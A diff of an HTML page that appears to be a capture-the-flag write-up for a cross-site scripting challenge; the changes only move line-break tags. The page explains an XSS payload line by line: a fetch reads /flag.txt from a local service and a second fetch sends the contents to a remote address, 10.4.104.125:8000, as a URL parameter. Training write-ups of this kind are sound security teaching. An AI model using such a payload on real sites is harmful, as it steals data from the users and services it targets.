@@ -28,8 +28,8 @@
 <p class="hero-sub" ">fetch('http://127.0.0.1:8080/flag.txt')  -- Uses the Fetch API to make an HTTP GET request from  the local address 127.0.0.1 on port 8080 for the resource /flag.txt."</p>
 <p class="hero-sub" ">.then(response => response.text()) — Waits for the HTTP response and reads the response."</p>
 <p class="hero-sub" ">.then(data => { ... }) — Once the text is available, runs the function with that text in the variable data."</p>
-<p class="hero-sub" ">Wfetch('http://10.4.104.125:8000/?flag= + encodeURIComponent(data)); — Sends the retrieved text to a remote server by making another GET request to 10.4.104.125:8000, including the text as the URL parameter flag (safely encoded with encodeURIComponent to ensure the data is URL-friendly)."</p>
-<p class="hero-sub" ">The response from my simple python server shows the flag encoded."</p><br></br>
+<p class="hero-sub" ">Wfetch('http://10.4.104.125:8000/?flag= + encodeURIComponent(data)); — Sends the retrieved text to a remote server by making another GET request to 10.4.104.125:8000, including the text as the URL parameter flag (safely encoded with encodeURIComponent to ensure the data is URL-friendly)."</p><br></br>
+<p class="hero-sub" ">The response from my simple python server shows the flag encoded."</p>
 <img class="hero-img" src="pages/PythonServerFlag.png"/>
-<p class="hero-sub" ">If we decode code it using Burp Suite.. . We get the flag using XSS."</p>
-<img class="hero-img" src="pages/Flagdecoded.png"/><br></br>
+<p class="hero-sub" ">If we decode code it using Burp Suite.. . We get the flag using XSS."</p><br></br>
+<img class="hero-img" src="pages/Flagdecoded.png"/>
